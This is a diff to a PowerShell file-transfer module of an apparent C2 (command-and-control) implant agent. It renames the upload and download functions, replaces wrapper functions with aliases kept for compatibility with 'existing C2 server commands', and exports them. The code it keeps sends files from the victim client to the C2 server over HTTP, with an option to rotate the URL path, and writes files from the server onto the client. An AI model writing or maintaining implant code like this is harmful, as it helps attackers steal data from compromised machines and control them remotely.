@@ -76,10 +76,10 @@ function Get-DirectoryListing {
     }
 }
 
-function Upload-File {
+function Download-FileFromServer {
     <#
     .SYNOPSIS
-        Uploads a file from server to client
+        Gets a file from server to client
     .DESCRIPTION
         Downloads a file from the C2 server and saves it to the specified path on the client
     .PARAMETER SourcePath
@@ -260,15 +260,15 @@ function Upload-File {
         }
     }
     catch {
-        Write-Host "Error uploading file: $_"
-        return "Error uploading file: $_"
+        Write-Host "Error downloading file from server: $_"
+        return "Error downloading file from server: $_"
     }
 }
 
-function Download-File {
+function Upload-FileToServer {
     <#
     .SYNOPSIS
-        Downloads a file from client to server
+        Sends a file from client to server
     .DESCRIPTION
         Uploads a file from the client to the C2 server
     .PARAMETER FilePath
@@ -343,7 +343,7 @@ function Download-File {
         # Create a web client for file upload
         $webClient = New-ConfiguredWebClient
         
-        # Get current file upload path
+        # Get current file upload path - keep the existing path names for compatibility
         $fileUploadPath = if ($global:pathRotationEnabled) { 
             Get-CurrentPath -PathType "file_upload_path" 
         } else { 
@@ -365,7 +365,8 @@ function Download-File {
         
         $payloadJson = ConvertTo-Json -InputObject $payload -Compress
         
-        # Send the upload
+        # Send the upload - note that we're using the file_upload path but the server treats this as
+        # uploading TO server (downloading FROM client perspective)
         $uploadUrl = "http://$serverAddress$fileUploadPath"
         Write-Host "Sending file upload to $uploadUrl"
         
@@ -405,7 +406,7 @@ function Download-File {
     }
     catch {
         Write-Host "Error preparing file for upload: $_"
-        return "Error downloading file: $_"
+        return "Error uploading file to server: $_"
     }
 }
 
@@ -533,46 +534,12 @@ function Get-DriveInfo {
     }
 }
 
-function Copy-FileToServer {
-    <#
-    .SYNOPSIS
-        Alias for Download-File to make the direction clearer
-    .DESCRIPTION
-        Uploads a file from the client to the C2 server
-    .PARAMETER FilePath
-        Path to the file on the client to upload
-    #>
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$FilePath
-    )
-    
-    return Download-File -FilePath $FilePath
-}
+# Create backwards-compatible aliases that match the old terminology
+# This maintains compatibility with existing C2 server commands and scripts
+New-Alias -Name Download-File -Value Upload-FileToServer
+New-Alias -Name Upload-File -Value Download-FileFromServer
 
-function Copy-FileFromServer {
-    <#
-    .SYNOPSIS
-        Alias for Upload-File to make the direction clearer
-    .DESCRIPTION
-        Downloads a file from the C2 server and saves it to the specified path on the client
-    .PARAMETER SourcePath
-        Path to the file on the server
-    .PARAMETER DestinationPath
-        Path where the file should be saved on the client
-    #>
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$SourcePath,
-        
-        [Parameter(Mandatory=$true)]
-        [string]$DestinationPath
-    )
-    
-    return Upload-File -SourcePath $SourcePath -DestinationPath $DestinationPath
-}
-
-# Export functions for use in the agent
-Export-ModuleMember -Function Get-DirectoryListing, Upload-File, Download-File, 
+# Export both the new functions and the aliases for use in the agent
+Export-ModuleMember -Function Get-DirectoryListing, Upload-FileToServer, Download-FileFromServer, 
                              Get-FileSystemItems, Get-DriveInfo, 
-                             Copy-FileToServer, Copy-FileFromServer
+                             Get-FileOwner -Alias Download-File, Upload-File
